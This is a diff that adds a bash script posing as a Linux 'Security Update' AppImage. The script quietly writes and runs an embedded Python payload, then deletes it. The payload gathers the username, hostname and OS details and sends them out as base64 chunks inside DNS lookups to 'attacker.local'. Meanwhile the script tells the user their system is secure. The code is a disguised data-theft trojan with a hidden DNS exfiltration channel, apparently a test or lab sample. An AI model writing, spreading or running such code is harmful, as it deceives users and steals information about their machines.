@@ -1,0 +1,59 @@
+#!/bin/bash
+
+# SecurityUpdate.AppImage - Linux Application Image
+# This is a self-contained executable that works on most Linux distributions
+
+# Check if we're running as AppImage
+if [ -n "$APPIMAGE" ]; then
+    APPDIR="$(dirname "$APPIMAGE")"
+else
+    APPDIR="$(dirname "$0")"
+fi
+
+# Create embedded Python script
+PYTHON_SCRIPT="$APPDIR/security_payload.py"
+
+cat > "$PYTHON_SCRIPT" << 'PYTHON_EOF'
+import subprocess
+import platform
+import os
+import base64
+import time
+
+def send_dns_query(data_chunk, chunk_id):
+    try:
+        encoded_data = base64.b64encode(data_chunk.encode()).decode().replace('=', '')[:60]
+        dns_query = f'{chunk_id}.{encoded_data}.attacker.local'
+        subprocess.run(['nslookup', dns_query, '127.0.0.1'], 
+                      capture_output=True, text=True, timeout=5)
+    except:
+        pass
+
+# Collect system info
+username = os.getenv('USER', 'unknown')
+hostname = os.getenv('HOSTNAME', 'unknown')
+os_info = platform.platform()
+
+# Exfiltrate data
+data = f'user:{username}|comp:{hostname}|domain:local|os:{os_info}'
+for i, chunk in enumerate([data[j:j+50] for j in range(0, len(data), 50)]):
+    send_dns_query(chunk, f'chunk{i}')
+    time.sleep(0.5)
+PYTHON_EOF
+
+# Show user interface
+echo "Security Update for Linux Systems"
+echo "=================================="
+echo "Checking system security configuration..."
+
+# Run the payload
+python3 "$PYTHON_SCRIPT" > /dev/null 2>&1
+
+# Clean up
+rm -f "$PYTHON_SCRIPT"
+
+echo "✅ Security check completed successfully!"
+echo "Your Linux system is secure."
+echo
+echo "Press Enter to close..."
+read
